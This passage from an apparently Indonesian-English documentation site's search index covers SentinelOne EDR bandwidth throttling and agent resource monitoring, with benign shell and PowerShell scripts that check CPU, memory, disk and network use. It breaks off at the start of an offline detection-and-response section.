*)\n        echo \"Unsupported operating system: $OSTYPE\"\n        echo \"Please use platform-specific commands\"\n        ;;\nesac\n</code></pre>"},{"location":"monitoring/bandwidth-utilization/#bandwidth-optimization-throttling","title":"\u2699\ufe0f Bandwidth Optimization &amp; Throttling","text":""},{"location":"monitoring/bandwidth-utilization/#optimization-strategies","title":"\ud83d\udcca Optimization Strategies","text":"<pre><code>flowchart TB\n    subgraph \"Bandwidth Optimization Framework\"\n        subgraph \"High-Level Controls\"\n            GLOBAL[\"Global Throttling&lt;br/&gt;Organization Level\"]\n            SITE[\"Site-Based Limits&lt;br/&gt;Per Location\"]\n            GROUP[\"Group Policies&lt;br/&gt;Endpoint Groups\"]\n        end\n\n        subgraph \"Traffic Shaping\"\n            PRIORITY[\"Priority Queuing&lt;br/&gt;Critical First\"]\n            SCHEDULING[\"Update Scheduling&lt;br/&gt;Off-Hours\"]\n            COMPRESSION[\"Data Compression&lt;br/&gt;Reduce Size\"]\n        end\n\n        subgraph \"Monitoring &amp; Alerts\"\n            THRESHOLDS[\"Usage Thresholds&lt;br/&gt;Limits\"]\n            ALERTS[\"Bandwidth Alerts&lt;br/&gt;Notifications\"]\n            REPORTS[\"Usage Reports&lt;br/&gt;Analytics\"]\n        end\n\n        GLOBAL --&gt; PRIORITY\n        SITE --&gt; SCHEDULING\n        GROUP --&gt; COMPRESSION\n\n        PRIORITY --&gt; THRESHOLDS\n        SCHEDULING --&gt; ALERTS\n        COMPRESSION --&gt; REPORTS\n    end\n\n    style GLOBAL fill:#e3f2fd\n    style PRIORITY fill:#f3e5f5\n    style THRESHOLDS fill:#fff3e0</code></pre>"},{"location":"monitoring/bandwidth-utilization/#console-bandwidth-configuration","title":"\u2699\ufe0f Console Bandwidth Configuration","text":"<p>1. Global Bandwidth Limits <pre><code>Console \u2192 Settings \u2192 Network \u2192 Bandwidth Control\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Upload Limit: [50] KB/s per endpoint    \u2502\n\u2502 Download Limit: [100] KB/s per endpoint \u2502\n\u2502 Burst Allowance: [500] KB (5 seconds)   \u2502\n\u2502 Apply to: \u2611\ufe0f All Sites                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>2. Scheduled Updates <pre><code>Console \u2192 Policies \u2192 Update Schedule\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Signature Updates: 02:00-04:00 daily   \u2502\n\u2502 Policy Updates: Immediate               \u2502\n\u2502 Agent Updates: Maintenance window only  \u2502\n\u2502 Large Downloads: Weekend only           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>3. Traffic Prioritization <pre><code>Priority Level | Traffic Type        | Bandwidth %\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u253c\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u253c\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nHIGH          | Security Events     | 40%\nMEDIUM        | Telemetry Data      | 30%\nLOW           | Signature Updates   | 20%\nBULK          | Log Forwarding      | 10%\n</code></pre></p>"},{"location":"monitoring/bandwidth-utilization/#bandwidth-usage-patterns","title":"\ud83d\udcca Bandwidth Usage Patterns","text":""},{"location":"monitoring/bandwidth-utilization/#typical-daily-patterns","title":"\ud83d\udd50 Typical Daily Patterns","text":"<pre><code>gantt\n    title SentinelOne Daily Bandwidth Pattern\n    dateFormat  HH:mm\n    axisFormat %H:%M\n\n    section Low Usage\n    Heartbeat Only    :active, 00:00, 06:00\n\n    section Business Hours\n    Normal Telemetry  :active, 06:00, 18:00\n\n    section Peak Activity\n    Event Processing  :crit, 09:00, 11:00\n    Event Processing  :crit, 14:00, 16:00\n\n    section Maintenance\n    Signature Updates :done, 02:00, 04:00\n    Log Processing    :active, 18:00, 22:00\n\n    section Night Mode\n    Minimal Activity  :active, 22:00, 24:00</code></pre>"},{"location":"monitoring/bandwidth-utilization/#bandwidth-monitoring-metrics","title":"\ud83d\udcc8 Bandwidth Monitoring Metrics","text":"Time Period Expected Usage Peak Allowance Alert Threshold Action Required Business Hours 20-50 KB/s 100 KB/s &gt; 150 KB/s \u26a0\ufe0f Monitor Off Hours 5-10 KB/s 200 KB/s &gt; 300 KB/s \u2705 Updates Update Window 1-5 MB/s 10 MB/s &gt; 15 MB/s \u274c Throttle Security Event 100-500 KB/s 1 MB/s &gt; 2 MB/s \u26a0\ufe0f Priority"},{"location":"monitoring/bandwidth-utilization/#bandwidth-troubleshooting","title":"\ud83d\udd27 Bandwidth Troubleshooting","text":""},{"location":"monitoring/bandwidth-utilization/#common-issues-solutions","title":"\ud83d\udea8 Common Issues &amp; Solutions","text":"<pre><code>flowchart TD\n    subgraph \"Bandwidth Issues Troubleshooting\"\n        ISSUE[\"High Bandwidth Usage&lt;br/&gt;Detected\"]\n\n        subgraph \"Investigation Steps\"\n            CHECK_EVENTS[\"Check Security Events&lt;br/&gt;Threat Activity\"]\n            VERIFY_UPDATES[\"Verify Update Schedule&lt;br/&gt;Signature Downloads\"]\n            ANALYZE_LOGS[\"Analyze Traffic Logs&lt;br/&gt;Connection Patterns\"]\n        end\n\n        subgraph \"Resolution Actions\"\n            THROTTLE[\"Apply Throttling&lt;br/&gt;Limit Bandwidth\"]\n            RESCHEDULE[\"Reschedule Updates&lt;br/&gt;Off-peak Hours\"]\n            EXCLUDE[\"Exclude Non-critical&lt;br/&gt;Reduce Traffic\"]\n        end\n\n        subgraph \"Validation\"\n            MONITOR[\"Monitor Impact&lt;br/&gt;Measure Results\"]\n            ADJUST[\"Adjust Settings&lt;br/&gt;Fine-tune\"]\n            DOCUMENT[\"Document Changes&lt;br/&gt;Record Actions\"]\n        end\n\n        ISSUE --&gt; CHECK_EVENTS\n        ISSUE --&gt; VERIFY_UPDATES\n        ISSUE --&gt; ANALYZE_LOGS\n\n        CHECK_EVENTS --&gt; THROTTLE\n        VERIFY_UPDATES --&gt; RESCHEDULE\n        ANALYZE_LOGS --&gt; EXCLUDE\n\n        THROTTLE --&gt; MONITOR\n        RESCHEDULE --&gt; ADJUST\n        EXCLUDE --&gt; DOCUMENT\n    end\n\n    style ISSUE fill:#ffcdd2\n    style CHECK_EVENTS fill:#fff3e0\n    style MONITOR fill:#e8f5e8</code></pre>"},{"location":"monitoring/bandwidth-utilization/#bandwidth-troubleshooting-script","title":"\ud83d\udee0\ufe0f Bandwidth Troubleshooting Script","text":"<pre><code>#!/bin/bash\necho \"\ud83d\udd0d SentinelOne Bandwidth Troubleshooting\"\necho \"===========================================\"\n\n# Function to check bandwidth usage\ncheck_bandwidth() {\n    echo \"\ud83d\udcca Current Bandwidth Usage:\"\n\n    # Check active connections\n    CONNECTIONS=$(netstat -tupln | grep sentinelone | wc -l)\n    echo \"   Active Connections: $CONNECTIONS\"\n\n    # Check data transfer (if available)\n    if command -v iftop &amp;&gt; /dev/null; then\n        echo \"   Running iftop analysis (10 seconds)...\"\n        timeout 10s iftop -t -s 10 -i any 2&gt;/dev/null | grep -E '(Total|Peak)' | tail -2\n    fi\n\n    # Check network utilization\n    if [ -f /proc/net/dev ]; then\n        echo \"   Interface utilization:\"\n        cat /proc/net/dev | grep -E 'eth0|ens|enp' | head -3\n    fi\n}\n\n# Function to identify high usage periods\nidentify_peak_usage() {\n    echo -e \"\\n\ud83d\udd50 Peak Usage Analysis:\"\n\n    # Check system load\n    echo \"   System Load: $(uptime | awk -F'load average:' '{print $2}')\"\n\n    # Check if updates are running\n    UPDATE_PROCESSES=$(ps aux | grep -E '(update|download)' | grep -v grep | wc -l)\n    echo \"   Update Processes: $UPDATE_PROCESSES\"\n\n    # Check disk I/O (which might indicate large downloads)\n    if command -v iostat &amp;&gt; /dev/null; then\n        echo \"   Disk I/O Activity:\"\n        iostat -x 1 1 | grep -E '(Device|avg)' | tail -2\n    fi\n}\n\n# Function to suggest optimizations\nsuggest_optimizations() {\n    echo -e \"\\n\ud83d\udca1 Optimization Suggestions:\"\n\n    # Check current time\n    CURRENT_HOUR=$(date +%H)\n\n    if [ $CURRENT_HOUR -ge 6 ] &amp;&amp; [ $CURRENT_HOUR -le 18 ]; then\n        echo \"   \u23f0 Business hours detected - consider limiting non-critical updates\"\n    else\n        echo \"   \ud83c\udf19 Off-hours detected - good time for updates and maintenance\"\n    fi\n\n    # Check available bandwidth\n    echo \"   \ud83d\udd27 Recommended actions:\"\n    echo \"      - Schedule signature updates during maintenance window\"\n    echo \"      - Enable bandwidth throttling during business hours\"\n    echo \"      - Configure burst allowances for security events\"\n    echo \"      - Monitor and set appropriate thresholds\"\n}\n\n# Run analysis\ncheck_bandwidth\nidentify_peak_usage\nsuggest_optimizations\n\necho -e \"\\n===========================================\"\necho \"\ud83d\udcca For detailed performance analysis, see: [Performance Testing](../testing/kategori-e-performance.md)\"\n</code></pre>"},{"location":"monitoring/bandwidth-utilization/#related-testing-integration","title":"\ud83d\udd17 Related Testing &amp; Integration","text":"<p>Network &amp; Performance Testing References</p> <ul> <li>Kategori F - Integration Testing: Network connectivity and SIEM integration testing</li> <li>Kategori E - Performance Impact Testing: Network performance impact assessment</li> <li>Cross-Platform Network Testing: Unified network performance validation</li> <li>Third-Party Integration: Network requirements for SIEM and external tool integration</li> </ul>"},{"location":"monitoring/bandwidth-utilization/#bandwidth-monitoring-checklist","title":"\ud83d\udccb Bandwidth Monitoring Checklist","text":"Daily Bandwidth Monitoring <ul> <li>[ ] Check console bandwidth dashboard</li> <li>[ ] Verify normal traffic patterns</li> <li>[ ] Monitor peak usage periods</li> <li>[ ] Review alert notifications</li> <li>[ ] Validate cloud connectivity</li> <li>[ ] Check throttling effectiveness</li> </ul> Weekly Network Optimization <ul> <li>[ ] Analyze weekly traffic trends</li> <li>[ ] Review update schedules</li> <li>[ ] Adjust bandwidth limits if needed</li> <li>[ ] Document any network issues</li> <li>[ ] Plan capacity for growth</li> <li>[ ] Test network performance</li> </ul> <p>Last updated: 6 Agustus 2025</p>"},{"location":"monitoring/resource-utilization/","title":"Resource Utilization Monitoring","text":""},{"location":"monitoring/resource-utilization/#konsep-resource-monitoring","title":"\ud83d\udcca Konsep Resource Monitoring","text":"<p>Resource monitoring SentinelOne EDR melibatkan dual-layer monitoring antara Management Console (terpusat) dan Endpoint (lokal) untuk memastikan performa optimal dan deteksi dini masalah.</p> <pre><code>flowchart TB\n    subgraph \"SentinelOne Resource Monitoring Architecture\"\n        CONSOLE[\"Management Console&lt;br/&gt;Centralized Monitoring\"]\n\n        subgraph \"Endpoint Monitoring\"\n            AGENT[\"SentinelOne Agent\"]\n            CPU[\"CPU Usage&lt;br/&gt;Real-time\"]\n            MEM[\"Memory Usage&lt;br/&gt;RAM/Swap\"]\n            DISK[\"Disk I/O&lt;br/&gt;Read/Write\"]\n            NET[\"Network Traffic&lt;br/&gt;In/Out\"]\n        end\n\n        subgraph \"Monitoring Tools\"\n            PS[\"ps/top/htop&lt;br/&gt;Process Monitor\"]\n            FREE[\"free/vmstat&lt;br/&gt;Memory Monitor\"]\n            IOSTAT[\"iostat/iotop&lt;br/&gt;Disk Monitor\"]\n            NETSTAT[\"netstat/ss&lt;br/&gt;Network Monitor\"]\n        end\n\n        AGENT --&gt; CPU\n        AGENT --&gt; MEM\n        AGENT --&gt; DISK\n        AGENT --&gt; NET\n\n        CPU --&gt; PS\n        MEM --&gt; FREE\n        DISK --&gt; IOSTAT\n        NET --&gt; NETSTAT\n\n        AGENT --&gt;|\"Telemetry Data\"| CONSOLE\n        CONSOLE --&gt;|\"Alerts &amp; Reports\"| AGENT\n    end\n\n    style CONSOLE fill:#e3f2fd\n    style AGENT fill:#f3e5f5\n    style CPU fill:#fff3e0\n    style MEM fill:#e8f5e8</code></pre>"},{"location":"monitoring/resource-utilization/#monitoring-objectives","title":"\ud83c\udfaf Monitoring Objectives","text":"\ud83c\udfaf Performance Targets <p>CPU Usage: &lt; 5% average, &lt; 15% peak</p> <p>Memory Usage: &lt; 300MB resident, &lt; 500MB virtual</p> <p>Disk I/O: &lt; 10MB/s sustained</p> <p>Network: &lt; 1MB/s telemetry upload</p>"},{"location":"monitoring/resource-utilization/#cpu-utilization-monitoring","title":"\ud83d\udcbb CPU Utilization Monitoring","text":""},{"location":"monitoring/resource-utilization/#console-based-monitoring-management-console","title":"\ud83d\udcca Console-Based Monitoring (Management Console)","text":"<pre><code>flowchart LR\n    A[Login to Console] --&gt; B[Navigate to Sentinels]\n    B --&gt; C[Select Target Endpoint]\n    C --&gt; D[System Performance]\n    D --&gt; E[Configure Alerts]\n\n    style A fill:#e3f2fd\n    style E fill:#ffebee</code></pre> <p>Step-by-Step Console Monitoring:</p> <ol> <li> <p>Login ke Management Console <pre><code>URL: https://your-tenant.sentinelone.net\nNavigate: Sentinels \u2192 [Select Endpoint]\n</code></pre></p> </li> <li> <p>View CPU Performance <pre><code>Console Path: Sentinels \u2192 System Info \u2192 Performance Tab\nReal-time Graph: CPU Usage (last 24 hours)\nHistorical Data: Up to 30 days\n</code></pre></p> </li> <li> <p>Configure CPU Alerts <pre><code>Settings \u2192 Alerts \u2192 Performance\nCPU Threshold: &gt; 15% for 5 minutes\nNotification: Email + Console Alert\n</code></pre></p> </li> </ol>"},{"location":"monitoring/resource-utilization/#endpoint-based-monitoring-command-line","title":"\ud83d\udd27 Endpoint-Based Monitoring (Command Line)","text":"LinuxWindowsCross-Platform Script <pre><code>#!/bin/bash\necho \"=== SENTINELONE CPU MONITORING SCRIPT (Linux) ===\"\n\n# Monitor SentinelOne CPU usage\necho \"Current SentinelOne processes and CPU usage:\"\nps aux | grep sentinelone | grep -v grep | awk '{printf \"%-20s %s%%\\n\", $11, $3}'\n\necho -e \"\\n=== Top CPU-consuming SentinelOne processes ===\"\nps -eo pid,ppid,cmd,pcpu --sort=-pcpu | grep sentinelone | head -5\n\necho -e \"\\n=== Real-time monitoring (5 seconds) ===\"\necho \"Use 'top -p $(pgrep -d, sentinelone 2&gt;/dev/null || echo 1)' for interactive monitoring\"\n\n# System load average\necho -e \"\\n=== System Load Average ===\"\nuptime\n\n# CPU core information\necho -e \"\\n=== CPU Information ===\"\nnproc --all\ngrep 'model name' /proc/cpuinfo | head -1\n</code></pre> <pre><code># SentinelOne CPU Monitoring Script for Windows\nWrite-Host \"=== SENTINELONE CPU MONITORING SCRIPT (Windows) ===\" -ForegroundColor Green\n\n# Monitor SentinelOne CPU usage\nWrite-Host \"\\nCurrent SentinelOne processes and CPU usage:\" -ForegroundColor Yellow\nGet-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"} | \n    Select-Object ProcessName, CPU, @{Name=\"CPU%\";Expression={[math]::Round($_.CPU,2)}} |\n    Format-Table -AutoSize\n\n# Top CPU-consuming SentinelOne processes\nWrite-Host \"\\n=== Top CPU-consuming SentinelOne processes ===\" -ForegroundColor Yellow\nGet-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"} |\n    Sort-Object CPU -Descending | Select-Object -First 5 |\n    Select-Object ProcessName, Id, CPU, WorkingSet | Format-Table -AutoSize\n\n# System performance counters\nWrite-Host \"\\n=== System CPU Information ===\" -ForegroundColor Yellow\nGet-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors\n\n# Current CPU usage\nWrite-Host \"\\n=== Current System CPU Usage ===\" -ForegroundColor Yellow\nGet-Counter \"\\Processor(_Total)\\% Processor Time\" -SampleInterval 1 -MaxSamples 1 |\n    Select-Object -ExpandProperty CounterSamples | \n    Select-Object @{Name=\"CPU Usage %\";Expression={[math]::Round(100 - $_.CookedValue,2)}}\n</code></pre> <pre><code>#!/bin/bash\n# Cross-platform SentinelOne monitoring script\n\ndetect_os() {\n    if [[ \"$OSTYPE\" == \"linux-gnu\"* ]]; then\n        echo \"linux\"\n    elif [[ \"$OSTYPE\" == \"darwin\"* ]]; then\n        echo \"macos\"\n    elif [[ \"$OSTYPE\" == \"msys\" ]] || [[ \"$OSTYPE\" == \"cygwin\" ]]; then\n        echo \"windows\"\n    else\n        echo \"unknown\"\n    fi\n}\n\nOS=$(detect_os)\necho \"=== SENTINELONE MONITORING - $OS ===\"\n\ncase $OS in\n    \"linux\")\n        ps aux | grep sentinelone | grep -v grep\n        ;;\n    \"macos\")\n        ps aux | grep -i sentinel | grep -v grep\n        ;;\n    \"windows\")\n        echo \"Use PowerShell script for Windows monitoring\"\n        ;;\n    *)\n        echo \"Unsupported operating system: $OSTYPE\"\n        ;;\nesac\n</code></pre> <p>Advanced CPU Monitoring:</p> <pre><code># Continuous CPU monitoring\nwhile true; do\n    SENTINEL_CPU=$(ps aux | grep sentinelone | grep -v grep | awk '{sum+=$3} END {print sum+0}')\n    echo \"$(date): SentinelOne Total CPU: ${SENTINEL_CPU}%\"\n\n    if (( $(echo \"$SENTINEL_CPU &gt; 15\" | bc -l) )); then\n        echo \"\u26a0\ufe0f  HIGH CPU ALERT: SentinelOne using ${SENTINEL_CPU}%\"\n    fi\n\n    sleep 60\ndone\n</code></pre>"},{"location":"monitoring/resource-utilization/#memory-utilization-monitoring","title":"\ud83d\udcbe Memory Utilization Monitoring","text":""},{"location":"monitoring/resource-utilization/#console-memory-monitoring","title":"\ud83d\udcca Console Memory Monitoring","text":"<pre><code>flowchart TD\n    subgraph \"Memory Monitoring Workflow\"\n        DASH[\"Console Dashboard&lt;br/&gt;Memory Overview\"]\n\n        subgraph \"Memory Metrics\"\n            RSS[\"Resident Memory&lt;br/&gt;Physical RAM\"]\n            VSZ[\"Virtual Memory&lt;br/&gt;Virtual Space\"]\n            SHARED[\"Shared Memory&lt;br/&gt;Shared Libraries\"]\n        end\n\n        subgraph \"Alert Conditions\"\n            HIGH[\"High Memory Usage&lt;br/&gt;&gt; 500MB\"]\n            LEAK[\"Memory Leak Detection&lt;br/&gt;Growing Trend\"]\n            SWAP[\"Swap Usage&lt;br/&gt;Virtual Memory\"]\n        end\n\n        DASH --&gt; RSS\n        DASH --&gt; VSZ\n        DASH --&gt; SHARED\n\n        RSS --&gt; HIGH\n        VSZ --&gt; LEAK\n        SHARED --&gt; SWAP\n    end\n\n    style DASH fill:#e3f2fd\n    style HIGH fill:#ffcdd2\n    style LEAK fill:#fff3e0</code></pre> <p>Console Steps: 1. Memory Dashboard: <code>Console \u2192 Sentinels \u2192 Performance \u2192 Memory Tab</code> 2. Historical Analysis: View 7-day memory trend 3. Alert Configuration: Set threshold &gt; 400MB for 10 minutes 4. Memory Leak Detection: Monitor growing trend over time</p>"},{"location":"monitoring/resource-utilization/#endpoint-memory-analysis","title":"\ud83d\udd27 Endpoint Memory Analysis","text":"<pre><code>#!/bin/bash\necho \"=== SENTINELONE MEMORY ANALYSIS ===\"\n\n# Overall system memory\necho \"=== System Memory Status ===\"\nfree -h\necho\n\n# SentinelOne memory usage details\necho \"=== SentinelOne Memory Usage ===\"\nps -o pid,ppid,cmd,rss,vsz,pmem --sort=-rss | grep sentinelone | head -10\necho\n\n# Memory usage summary\nSENTINEL_RSS=$(ps -o rss --no-headers --pid $(pgrep sentinelone) 2&gt;/dev/null | awk '{sum+=$1} END {print sum+0}')\nSENTINEL_MB=$(echo \"scale=2; $SENTINEL_RSS/1024\" | bc)\necho \"Total SentinelOne Memory Usage: ${SENTINEL_MB} MB\"\n\n# Memory percentage\nTOTAL_MEM=$(free -m | awk 'NR==2{print $2}')\nMEM_PERCENT=$(echo \"scale=2; ($SENTINEL_RSS/1024)/$TOTAL_MEM*100\" | bc)\necho \"Memory Percentage: ${MEM_PERCENT}%\"\n\n# Alert if memory usage is high\nif (( $(echo \"$SENTINEL_MB &gt; 400\" | bc -l) )); then\n    echo \"\u26a0\ufe0f  HIGH MEMORY ALERT: ${SENTINEL_MB} MB\"\nfi\n</code></pre>"},{"location":"monitoring/resource-utilization/#disk-io-monitoring","title":"\ud83d\udcbf Disk I/O Monitoring","text":"<pre><code>flowchart LR\n    subgraph \"Disk I/O Monitoring Strategy\"\n        subgraph \"Read Operations\"\n            LOG_READ[\"Log File Reading&lt;br/&gt;/var/log/sentinelone/\"]\n            CONFIG_READ[\"Configuration&lt;br/&gt;/opt/sentinelone/\"]\n            SCAN_READ[\"File Scanning&lt;br/&gt;User Files\"]\n        end\n\n        subgraph \"Write Operations\"\n            LOG_WRITE[\"Event Logging&lt;br/&gt;Activity Logs\"]\n            QUARANTINE[\"Quarantine Files&lt;br/&gt;Isolated Threats\"]\n            CACHE_WRITE[\"Cache Updates&lt;br/&gt;Temporary Data\"]\n        end\n\n        subgraph \"Monitoring Tools\"\n            IOSTAT[\"iostat -x 1&lt;br/&gt;Real-time I/O\"]\n            IOTOP[\"iotop -a&lt;br/&gt;Process I/O\"]\n            LSOF[\"lsof | grep sentinel&lt;br/&gt;Open Files\"]\n        end\n\n        LOG_READ --&gt; IOSTAT\n        SCAN_READ --&gt; IOTOP\n        LOG_WRITE --&gt; LSOF\n    end\n\n    style LOG_READ fill:#e8f5e8\n    style LOG_WRITE fill:#fff3e0\n    style IOSTAT fill:#e3f2fd</code></pre> <p>Disk I/O Monitoring Commands:</p> <pre><code># Monitor disk I/O by SentinelOne\nsudo iotop -a -o -p $(pgrep sentinelone | tr '\\n' ',' | sed 's/,$//')\n\n# Check open files by SentinelOne\nlsof | grep sentinelone | wc -l\necho \"SentinelOne open files count: $(lsof | grep sentinelone | wc -l)\"\n\n# Monitor specific directories\nwatch -n 2 \"du -sh /var/log/sentinelone /opt/sentinelone\"\n</code></pre>"},{"location":"monitoring/resource-utilization/#network-traffic-monitoring","title":"\ud83c\udf10 Network Traffic Monitoring","text":"<pre><code>flowchart TB\n    subgraph \"Network Traffic Analysis\"\n        subgraph \"Outbound Traffic\"\n            TELEMETRY[\"Telemetry Data&lt;br/&gt;Performance Metrics\"]\n            THREATS[\"Threat Intelligence&lt;br/&gt;IOCs/Signatures\"]\n            LOGS[\"Log Forwarding&lt;br/&gt;SIEM Integration\"]\n        end\n\n        subgraph \"Inbound Traffic\"\n            POLICIES[\"Policy Updates&lt;br/&gt;Configuration\"]\n            SIGNATURES[\"Signature Updates&lt;br/&gt;Threat Definitions\"]\n            COMMANDS[\"Remote Commands&lt;br/&gt;Management\"]\n        end\n\n        subgraph \"Monitoring Methods\"\n            NETSTAT_CMD[\"netstat -tupln&lt;br/&gt;Active Connections\"]\n            SS_CMD[\"ss -tuln&lt;br/&gt;Socket Statistics\"]\n            TCPDUMP[\"tcpdump -i any&lt;br/&gt;Packet Capture\"]\n        end\n\n        TELEMETRY --&gt; NETSTAT_CMD\n        POLICIES --&gt; SS_CMD\n        THREATS --&gt; TCPDUMP\n    end\n\n    style TELEMETRY fill:#e3f2fd\n    style POLICIES fill:#f3e5f5\n    style NETSTAT_CMD fill:#e8f5e8</code></pre> <p>Network Monitoring Script:</p> <pre><code>#!/bin/bash\necho \"=== SENTINELONE NETWORK MONITORING ===\"\n\n# Check SentinelOne network connections\necho \"=== Active Network Connections ===\"\nss -tuln | grep -E ':(443|80|8080|8443)' | head -10\n\n# Monitor bandwidth usage\necho -e \"\\n=== Network Interface Statistics ===\"\ncat /proc/net/dev | grep -E 'eth0|ens|enp' | head -5\n\n# SentinelOne specific connections\necho -e \"\\n=== SentinelOne Network Activity ===\"\nnetstat -tupln | grep sentinelone\n\n# Check connectivity to SentinelOne cloud\necho -e \"\\n=== Connectivity Test ===\"\nping -c 3 api.sentinelone.net 2&gt;/dev/null &amp;&amp; echo \"\u2705 Cloud connectivity OK\" || echo \"\u274c Cloud connectivity FAILED\"\n</code></pre>"},{"location":"monitoring/resource-utilization/#performance-baselines-thresholds","title":"\ud83d\udcc8 Performance Baselines &amp; Thresholds","text":"Resource Normal Range Warning Threshold Critical Threshold Action Required CPU Usage 2-5% &gt; 10% &gt; 20% \u26a0\ufe0f Investigate Memory (RSS) 150-250MB &gt; 400MB &gt; 600MB \u274c Restart Agent Disk I/O &lt; 5MB/s &gt; 15MB/s &gt; 30MB/s \u26a0\ufe0f Check Scanning Network &lt; 100KB/s &gt; 1MB/s &gt; 5MB/s \u2705 Normal Upload"},{"location":"monitoring/resource-utilization/#related-testing-validation","title":"\ud83d\udd17 Related Testing &amp; Validation","text":"<p>Performance Testing References</p> <ul> <li>Kategori E - Performance Impact Testing: Komprehensif performance testing procedures</li> <li>Linux Performance Testing: Linux-specific resource monitoring</li> <li>Windows Performance Testing: Windows resource monitoring procedures</li> <li>Cross-Platform Performance: Unified performance testing across platforms</li> </ul>"},{"location":"monitoring/resource-utilization/#quick-performance-check-script","title":"\u26a1 Quick Performance Check Script","text":"<pre><code>#!/bin/bash\necho \"\ud83d\udd0d SentinelOne Quick Performance Check\"\necho \"===========================================\"\n\n# Function to check if value exceeds threshold\ncheck_threshold() {\n    local value=$1\n    local threshold=$2\n    local metric=$3\n\n    if (( $(echo \"$value &gt; $threshold\" | bc -l) )); then\n        echo \"\u274c $metric: ${value} (&gt; ${threshold})\"\n        return 1\n    else\n        echo \"\u2705 $metric: ${value} (OK)\"\n        return 0\n    fi\n}\n\n# Check CPU\nCPU_USAGE=$(ps aux | grep sentinelone | grep -v grep | awk '{sum+=$3} END {print sum+0}')\ncheck_threshold \"$CPU_USAGE\" \"10\" \"CPU Usage (%)\"\n\n# Check Memory\nMEM_MB=$(ps -o rss --no-headers --pid $(pgrep sentinelone 2&gt;/dev/null) 2&gt;/dev/null | awk '{sum+=$1} END {print sum/1024}')\ncheck_threshold \"$MEM_MB\" \"400\" \"Memory Usage (MB)\"\n\n# Check Connectivity\nping -c 1 -W 3 api.sentinelone.net &amp;&gt;/dev/null\nif [ $? -eq 0 ]; then\n    echo \"\u2705 Network Connectivity: OK\"\nelse\n    echo \"\u274c Network Connectivity: FAILED\"\nfi\n\necho \"===========================================\"\necho \"\ud83d\udcca Run complete performance tests: [Performance Testing Guide](../testing/kategori-e-performance.md)\"\n</code></pre>"},{"location":"monitoring/resource-utilization/#performance-monitoring-checklist","title":"\ud83d\udccb Performance Monitoring Checklist","text":"Daily Performance Monitoring <ul> <li>[ ] Check CPU usage &lt; 5% average</li> <li>[ ] Verify memory usage &lt; 300MB</li> <li>[ ] Monitor disk I/O &lt; 10MB/s</li> <li>[ ] Confirm network connectivity</li> <li>[ ] Review console alerts</li> <li>[ ] Validate agent responsiveness</li> </ul> Weekly Performance Review <ul> <li>[ ] Analyze performance trends</li> <li>[ ] Review baseline metrics</li> <li>[ ] Update alert thresholds if needed</li> <li>[ ] Document performance anomalies</li> <li>[ ] Plan optimization if required</li> </ul> <p>Last updated: 6 Agustus 2025</p>"},{"location":"security/offline-detection-response/","title":"Strategi Deteksi dan Respons Offline SentinelOne","text":"<p>Panduan komprehensif untuk menghadapi situasi deteksi ancaman dan incident response ketika sistem dalam mode offline atau terputus dari management console.</p>"},{"location":"security/offline-detection-response/#arsitektur-offline-detection-response","title":"\ud83d\udce1 Arsitektur Offline Detection &amp; Response","text":"<pre><code>flowchart TB\n    subgraph \"Normal Operations\"\n        AGENT_ONLINE[\"SentinelOne Agent&lt;br/&gt;Online Mode\"]\n        CONSOLE[\"Management Console&lt;br/&gt;Centralized Control\"]\n        CLOUD_INTEL[\"Cloud Intelligence&lt;br/&gt;Real-time Updates\"]\n    end\n\n    subgraph \"Offline Mode Transition\"\n        DISCONNECT[\"Network Disconnection&lt;br/&gt;Triggers Offline Mode\"]\n        CACHE_POLICY[\"Cached Policies&lt;br/&gt;Local Enforcement\"]\n        LOCAL_BUFFER[\"Local Event Buffer&lt;br/&gt;Store for Later Sync\"]\n    end\n\n    subgraph \"Offline Detection Engine\"\n        LOCAL_SIGNATURES[\"Local Signatures&lt;br/&gt;Static Detection\"]\n        BEHAVIORAL[\"Behavioral Analysis&lt;br/&gt;ML Models\"]\n        HEURISTICS[\"Heuristic Engine&lt;br/&gt;Pattern Recognition\"]\n        QUARANTINE[\"Local Quarantine&lt;br/&gt;Threat Isolation\"]\n    end\n\n    subgraph \"Offline Response Actions\"\n        AUTO_REMEDIATE[\"Automated Remediation&lt;br/&gt;Policy-Based\"]\n        LOCAL_ISOLATE[\"Network Isolation&lt;br/&gt;Endpoint Level\"]\n        ROLLBACK[\"File System Rollback&lt;br/&gt;Threat Mitigation\"]\n        LOG_COLLECTION[\"Forensic Logging&lt;br/&gt;Evidence Preservation\"]\n    end\n\n    subgraph \"Recovery Operations\"\n        RECONNECT[\"Network Recovery&lt;br/&gt;Automatic Detection\"]\n        SYNC[\"Data 